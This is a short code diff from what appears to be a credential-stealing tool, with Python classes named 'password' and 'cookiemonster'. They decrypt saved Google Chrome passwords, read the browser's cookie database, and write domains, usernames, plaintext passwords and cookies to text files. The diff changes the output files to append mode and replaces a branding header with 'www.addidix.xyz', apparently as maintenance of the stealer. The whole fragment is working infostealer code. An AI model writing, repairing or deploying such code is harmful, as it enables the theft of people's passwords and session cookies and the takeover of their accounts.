@@ -364,7 +364,7 @@ class password():
                 encrypted_password = r[2]
                 decrypted_password = self.decrypt_password(encrypted_password, master_key)
                 if url != "":
-                    with open("google-passwords.txt", "w") as f:
+                    with open("google-passwords.txt", "a") as f:
                         f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
         except:
             pass
@@ -400,7 +400,8 @@ class cookiemonster:
         conn = connect("Loginvault.db")
         cursor = conn.cursor()
         with open(".\google-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
-            f.write("whosaddidix?#1400 /// Google Chrome Cookies\n\n")
+            f.write("www.addidix.xyz /// Google Chrome Cookies\n\n")
+        with open(".\google-cookies.txt", "a", encoding="cp437", errors='ignore') as f:      
             try:
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                 for r in cursor.fetchall():
